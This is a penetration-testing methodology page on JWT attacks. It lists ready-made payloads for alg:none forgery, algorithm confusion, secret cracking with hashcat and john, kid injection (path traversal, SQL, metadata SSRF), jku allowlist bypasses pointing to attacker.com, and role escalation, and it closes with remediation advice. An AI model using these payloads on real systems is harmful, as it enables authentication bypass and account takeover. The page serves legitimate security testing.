---
title: "JWT Attacks"
date: 2026-02-24
draft: false
---

# JWT Attacks

> **Severity**: High–Critical | **CWE**: CWE-347
> **OWASP**: A02:2021 – Cryptographic Failures

---

## What Is a JWT?

A JSON Web Token consists of three base64url-encoded parts separated by dots:

```
HEADER.PAYLOAD.SIGNATURE

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← header: {"alg":"HS256","typ":"JWT"}
.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ  ← payload: {"sub":"user123","role":"user"}
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← HMAC-SHA256 signature
```

The server trusts the payload **only if the signature is valid**. Every attack targets the signature verification step.

---

## Attack Surface

```
# Where JWTs appear:
Authorization: Bearer eyJ...
Cookie: token=eyJ...
Cookie: session=eyJ...
X-Auth-Token: eyJ...
POST body: {"token": "eyJ..."}
URL parameter: ?jwt=eyJ...

# Identify JWT:
- Three base64url segments separated by dots
- Starts with eyJ (base64 of {"al or {"ty)
- Can decode header/payload with: base64 -d (pad with = if needed)
```

---

## Discovery Checklist

- [ ] Find all JWT tokens in requests/responses
- [ ] Decode header: `echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d`
- [ ] Note `alg` field — is it `HS256`, `RS256`, `none`, `ES256`?
- [ ] Test `alg: none` bypass
- [ ] Test algorithm confusion: RS256 → HS256 with public key as secret
- [ ] Test weak secret brute-force
- [ ] Test `kid` header injection (SQL, path traversal, SSRF)
- [ ] Test `jku` / `x5u` header injection (external JWK set)
- [ ] Test `jwk` header embedding
- [ ] Modify payload claims (role, admin, sub) — does server validate signature?

---

## Payload Library

### Attack 1 — `alg: none` (Unsigned Token)

Some libraries accept tokens with no signature when `alg` is set to `none`.

```bash
# Original header: {"alg":"HS256","typ":"JWT"}
# Modified header: {"alg":"none","typ":"JWT"}

# Base64url encode modified header (no padding):
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
# → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Modified payload with elevated role:
echo -n '{"sub":"user123","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_'
# → eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluIn0

# Final token (trailing dot, empty signature):
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluIn0.

# Variants of "none":
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":"none "}          ← trailing space
{"alg":""}               ← empty string
{"alg":null}
{"alg":"hs256"}          ← wrong case — some libs fall back to none
```

### Attack 2 — Algorithm Confusion: RS256 → HS256

When server uses RS256 (asymmetric), the **public key is often publicly accessible**. If the library accepts HS256 when RS256 is expected, you can sign with the public key as the HMAC secret — the server verifies using the same public key.

```bash
# Step 1: Get public key
# Common locations:
curl https://target.com/.well-known/jwks.json
curl https://target.com/auth/realms/master/protocol/openid-connect/certs
curl https://target.com/oauth/.well-known/openid-configuration  # → jwks_uri
# Or extract from existing valid token via jwt_forgery.py

# Step 2: Convert public key to PEM format (if in JWK format):
# Tool: jwt_tool, python-jwt, or manual:
python3 -c "
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import jwt, base64, json

# Load JWK:
jwk = {'kty':'RSA','n':'...','e':'AQAB'}
# Convert to PEM for use as HS256 secret
"

# Step 3: Forge token signed with public key via HS256:
python3 jwt_tool.py TOKEN -X a  # jwt_tool auto-detects algorithm confusion

# Manual with PyJWT:
python3 -c "
import jwt
public_key = open('public.pem','rb').read()
payload = {'sub':'user123','role':'admin'}
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
"
```

### Attack 3 — Weak Secret Brute-Force

HS256/HS384/HS512 uses a shared secret. Weak secrets are crackable offline.

```bash
# hashcat — GPU cracking (fastest):
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 jwt.txt wordlist.txt --show

# john the ripper:
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# jwt-cracker (Node.js):
npm install -g @lmammino/jwt-cracker
jwt-cracker -t eyJ... -a HS256 -w wordlist.txt

# jwt_tool brute-force:
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets to try first:
secret, password, 123456, qwerty, admin, test, jwt, key,
your-256-bit-secret, supersecret, letmein, changeit
""  ← empty string
" " ← single space

# Brute-force with custom charset (if numeric):
hashcat -a 3 -m 16500 jwt.txt ?d?d?d?d?d?d  # 6-digit numeric
```

### Attack 4 — `kid` Header Injection

The `kid` (Key ID) header tells the server which key to use for verification. If it's user-controlled and passed to a file read or database query:

```bash
# kid = path traversal → read known file as secret:
# If server does: key = read_file("/keys/" + kid)
# Inject: {"kid": "../../dev/null"}  → file is empty → HMAC secret = empty string

# kid = /dev/null → sign with empty string:
python3 -c "
import jwt
payload = {'sub':'admin','role':'admin'}
token = jwt.encode(payload, '', algorithm='HS256',
                   headers={'kid': '../../dev/null'})
print(token)
"

# kid variants:
{"kid": "../../dev/null"}
{"kid": "/dev/null"}
{"kid": "../../../dev/null"}
{"kid": "../../proc/sys/kernel/randomize_va_space"}  ← content = "2\n"
{"kid": "/etc/passwd"}  ← sign with /etc/passwd content as secret

# kid = SQL injection → if key fetched from DB:
{"kid": "x' UNION SELECT 'secretkey'-- -"}
{"kid": "x' UNION SELECT 'secretkey' FROM dual-- -"}
# Then sign token with 'secretkey' as HMAC secret

# kid = SSRF → if server fetches external key:
{"kid": "https://attacker.com/key.json"}
{"kid": "http://169.254.169.254/latest/meta-data/"}
```

### Attack 5 — `jku` / `x5u` Header Injection

`jku` (JWK Set URL) points to a set of public keys. If attacker-controlled, host a JWK set with your own keys.

```bash
# Step 1: Generate RSA key pair:
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub

# Step 2: Create JWK set (host on attacker.com/jwks.json):
python3 -c "
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import jwt, json, base64

# Use jwt_tool to generate: python3 jwt_tool.py TOKEN -X s
# Or manually create jwks.json with your public key
"

# Step 3: Forge token with jku pointing to your server:
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}

# Bypass allowlist on jku (if target checks domain):
{"jku":"https://target.com.attacker.com/jwks.json"}
{"jku":"https://target.com/redirect?url=https://attacker.com/jwks.json"}
{"jku":"https://attacker.com/jwks.json#target.com"}

# jwt_tool automates this:
python3 jwt_tool.py TOKEN -X s -ju "https://attacker.com/jwks.json"
```

### Attack 6 — `jwk` Header Embedding

Embed your own public key directly in the token header:

```bash
# jwt_tool:
python3 jwt_tool.py TOKEN -X s  # embeds generated key in jwk header

# Manual: header becomes:
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "YOUR_PUBLIC_KEY_N",
    "e": "AQAB"
  }
}
# Sign with corresponding private key → server uses embedded public key to verify
```

### Attack 7 — Claim Manipulation (if signature not checked)

Sometimes applications **decode without verifying**:

```bash
# Decode payload, modify, re-encode (without valid signature):
# Original: eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ
echo "eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ==" | base64 -d
# {"sub":"user123","role":"user"}

# Modified:
echo -n '{"sub":"admin","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_'

# Replace middle segment, keep original signature:
# → server validates format but not content? Test it.

# Common claims to escalate:
"role": "admin"
"admin": true
"is_admin": 1
"sub": "admin"
"user_id": 1
"permissions": ["admin","read","write"]
"scope": "admin:full"
"group": "administrators"
```

---

## Automated Tools

```bash
# jwt_tool — comprehensive JWT attack toolkit:
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt

# Decode and check:
python3 jwt_tool.py eyJ...

# alg:none attack:
python3 jwt_tool.py eyJ... -X a

# Algorithm confusion (RS256→HS256):
python3 jwt_tool.py eyJ... -X k -pk public.pem

# jku injection:
python3 jwt_tool.py eyJ... -X s -ju "https://attacker.com/jwks.json"

# Crack secret:
python3 jwt_tool.py eyJ... -C -d rockyou.txt

# Tamper payload and sign:
python3 jwt_tool.py eyJ... -T -S hs256 -p "password"

# hashcat JWT crack:
hashcat -a 0 -m 16500 eyJ... rockyou.txt

# Burp JWT Editor extension (BApp Store):
# - Decode/modify JWT in Repeater
# - Embedded attack modes: alg:none, algorithm confusion, brute-force
# - JWK set generation for jku attacks

# jwt.io — manual decode/verify (online):
# https://jwt.io
```

---

## Remediation Reference

- **Verify signature before trusting claims** — never decode-then-use without verify
- **Reject `alg: none`** explicitly in library config
- **Fix algorithm to one value** server-side — never trust the `alg` header to select the verification algorithm
- **Validate `kid`, `jku`, `x5u`** against a strict allowlist — never use them as file paths or DB keys
- **Use strong secrets for HS256**: minimum 256 bits (32 bytes) random, not dictionary words
- **Prefer short expiration** (`exp` claim) + refresh token rotation
- **Use asymmetric RS256/ES256** for distributed systems, not shared HS256

*Part of the Web Application Penetration Testing Methodology series.*
